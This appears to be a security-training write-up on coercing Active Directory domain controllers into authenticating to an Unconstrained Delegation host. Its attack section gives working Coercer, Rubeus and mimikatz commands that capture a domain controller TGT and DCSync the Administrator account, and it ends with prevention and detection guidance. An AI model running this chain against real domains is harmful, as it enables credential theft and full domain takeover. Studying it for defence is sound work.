<img width="1585" height="293" alt="image" src="https://github.com/user-attachments/assets/21a89151-f335-4f96-9e66-555197335139" /># 🔴 Coercing Attacks & Unconstrained Delegation

## 📖 Description

Coercing attacks have become a one-stop shop for escalating privileges from any user to Domain Administrator. Nearly every organization with a default AD infrastructure is vulnerable. We've just tasted coercing attacks when we discussed the PrinterBug. However, several other RPC functions can perform the same functionality. Therefore, any domain user can coerce RemoteServer$ to authenticate to any machine in the domain. Eventually, the Coercer tool was developed to exploit all known vulnerable RPC functions simultaneously.

Similar to the PrinterBug, an attacker can choose from several "follow up" options with the reverse connection, which, as mentioned before, are:

* Relay the connection to another DC and perform DCSync (if SMB Signing is disabled).
* Force the Domain Controller to connect to a machine configured for Unconstrained Delegation (UD) - this will cache the TGT in the memory of the UD server, which can be captured/exported with tools like Rubeus and Mimikatz.
* Relay the connection to Active Directory Certificate Services to obtain a certificate for the Domain Controller. Threat agents can then use the certificate on-demand to authenticate and pretend to be the Domain Controller (e.g., DCSync).
* Relay the connection to configure Resource-Based Kerberos Delegation for the relayed machine. We can then abuse the delegation to authenticate as any Administrator to that machine.

---

## 🔴 Attack

We will abuse the second "follow-up", assuming that an attacker has gained administrative rights on a server configured for Unconstrained Delegation. We will use this server to capture the TGT, while Coercer will be executed from the Kali machine.

To identify systems configured for Unconstrained Delegation, we can use the Get-NetComputer function from PowerView along with the -Unconstrained switch:

```powershell
PS C:\Users\bob\Downloads> Get-NetComputer -Unconstrained | select samaccountname
```

<img width="1585" height="293" alt="image" src="https://github.com/user-attachments/assets/53e00c68-e2f1-4844-8106-d1659dc41af9" />

WS001 and SERVER01 are trusted for Unconstrained delegation (Domain Controllers are trusted by default). So either WS001 or Server01 would be a target for an adversary. In our scenario, we have already compromised WS001 and 'Bob', who has administrative rights on this host. We will start Rubeus in an administrative prompt to monitor for new logons and extract TGTs:

```powershell
PS C:\Users\bob\Downloads> .\Rubeus.exe monitor /interval:1
```

<img width="652" height="688" alt="image" src="https://github.com/user-attachments/assets/7dbad7ab-e7dc-401e-9111-3d323db2e252" />

<img width="1356" height="951" alt="image" src="https://github.com/user-attachments/assets/cf4b6281-d227-48fa-92ab-07e41bbe4020" />

Next, we need to know the IP address of WS001, which we can be obtain by running ipconfig. Once known, we will switch to the Kali machine to execute Coercer towards DC1, while we force it to connect to WS001 if coercing is successful:

```shellsession
@htb[/htb]$ Coercer -u bob -p Slavi123 -d eagle.local -l ws001.eagle.local -t dc1.eagle.local
```

<img width="647" height="739" alt="image" src="https://github.com/user-attachments/assets/9deee84c-eea2-4dd6-9999-d8bf95631803" />

<img width="2705" height="755" alt="image" src="https://github.com/user-attachments/assets/418b2f07-5e76-4d26-8eb7-b47ba230d92e" />

Now, if we switch to WS001 and look at the continuous output that Rubeus provide, there should be a TGT for DC1 available:

<img width="652" height="591" alt="image" src="https://github.com/user-attachments/assets/3d09bf55-b2f9-443e-a22d-6539e30fd286" />

<img width="1420" height="875" alt="image" src="https://github.com/user-attachments/assets/eafef9ef-9212-4afc-99ff-edb7e2e93968" />

We can use this TGT for authentication within the domain, becoming the Domain Controller. From there onwards, DCSync is an obvious attack (among others).

One way of using the abovementioned TGT is through Rubeus, as follows.

```powershell
PS C:\Users\bob\Downloads> .\Rubeus.exe ptt /ticket:doIFdDCCBXCgAwIBBa...
```

<img width="614" height="597" alt="image" src="https://github.com/user-attachments/assets/f7d84415-064c-4f1f-befa-b26d17e16641" />

Then, a DCSync attack can be executed through mimikatz, essentially by replicating what we did in the DCSync section.

```powershell
PS C:\Users\bob\Downloads\mimikatz_trunk\x64> .\mimikatz.exe "lsadump::dcsync /domain:eagle.local /user:Administrator"

<img width="507" height="863" alt="image" src="https://github.com/user-attachments/assets/1225f632-2127-48bc-93ed-ec8f2e358364" />

```

---

## 🛡️ Prevention

Windows does not offer granular visibility and control over RPC calls to allow discovering what is being used and block certain functions. Therefore, an out-of-the-box solution for preventing this attack does not exist currently. However, there are two different general approaches to preventing coercing attacks:

* Implementing a third-party RPC firewall, such as the one from zero networks, and using it to block dangerous RPC functions. This tool also comes up with an audit mode, allowing monitoring and gaining visibility on whether business disruptions may occur by using it or not. Moreover, it goes a step further by providing the functionality of blocking RPC functions if the dangerous OPNUM associated with coercing is present in the request. (Note that in this option, for every newly discovered RPC function in the future, we will have to modify the firewall's configuration file to include it.)
* Block Domain Controllers and other core infrastructure servers from connecting to outbound ports 139 and 445, except to machines that are required for AD (as well for business operations). One example is that while we block general outbound traffic to ports 139 and 445, we still should allow it for cross Domain Controllers; otherwise, domain replication will fail. (The benefit of this solution is that it will also work against newly discovered vulnerable RPC functions or other coercing methods.)

In addition, organizations should regularly review systems configured for Unconstrained Delegation and remove the configuration where it is not required. Administrative access to systems trusted for Unconstrained Delegation should also be tightly restricted, especially for highly privileged accounts.

Domain Controllers and other core infrastructure servers should have restricted outbound SMB connectivity, while preserving the connections required for legitimate Active Directory operations. Regular auditing of delegation configuration and privileged access can also help identify unnecessary exposure.

---

## 🔎 Detection

As mentioned, Windows does not provide an out-of-the-box solution for monitoring RPC activity. The RPC Firewall from zero networks is an excellent method of detecting the abuse of these functions and can indicate immediate signs of compromise; however, if we follow the general recommendations to not install third-party software on Domain Controllers then firewall logs are our best chance.

A successful coercing attack with Coercer will result in the following host firewall log, where the machine at .128 is the attacker machine and the .200 is the Domain Controller:

<img width="2419" height="1248" alt="image" src="https://github.com/user-attachments/assets/bae6aafd-d981-46f4-8ae6-1572ae08ec13" />

We can see plenty of incoming connections to the DC, followed up by outbound connections from the DC to the attacker machine; this process repeats a few times as Coercer goes through several different functions. All of the outbound traffic is destined for port 445.

If we go forward and block outbound traffic to port 445, then we will observe the following behavior:

<img width="1732" height="508" alt="image" src="https://github.com/user-attachments/assets/7296dae6-0265-4b67-ac2d-47b150c23d3e" />

Now we can see that even though the inbound connection is successful, the firewall drops the outbound one, and consequently, the attacker does not receive any coerced TGTs. Sometimes, when port 445 is blocked, the machine will attempt to connect to port 139 instead, so blocking both ports 139 and 445 is recommended.

The above can also be used for detection, as any unexpected dropped traffic to ports 139 or 445 is suspicious.

---

## 🔑 Key Takeaway

**Coercing Attacks & Unconstrained Delegation** means an attacker abuses vulnerable RPC functions to force a Domain Controller to authenticate to a machine configured for Unconstrained Delegation. That authentication can result in the Domain Controller's TGT being cached on the compromised system and then reused by the attacker.

The main security lesson is that **coercing attacks become especially dangerous when combined with Unconstrained Delegation**, because a forced authentication can expose reusable Kerberos credentials.
